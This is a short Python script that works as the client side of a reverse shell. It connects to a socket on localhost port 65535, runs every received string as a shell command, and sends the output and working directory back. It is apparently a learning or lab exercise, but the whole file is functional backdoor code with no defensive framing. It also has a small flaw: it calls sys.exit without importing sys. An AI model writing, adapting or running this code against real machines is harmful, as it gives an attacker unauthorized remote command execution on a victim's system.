import os
import socket
import subprocess

sock = socket.socket()
host = 'localhost'
port = 65535
sock.connect((host, port))

while True:
    data = sock.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        if data[:].decode("utf-8") == 'exit':
            break

        command = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_in_bytes = command.stdout.read() + command.stderr.read()
        output_in_str = str(output_in_bytes, "utf-8")
        sock.send(str.encode(output_in_str + str(os.getcwd()) + "> "))
        print(output_in_str)


# Close Connection
sock.close()
sys.exit()



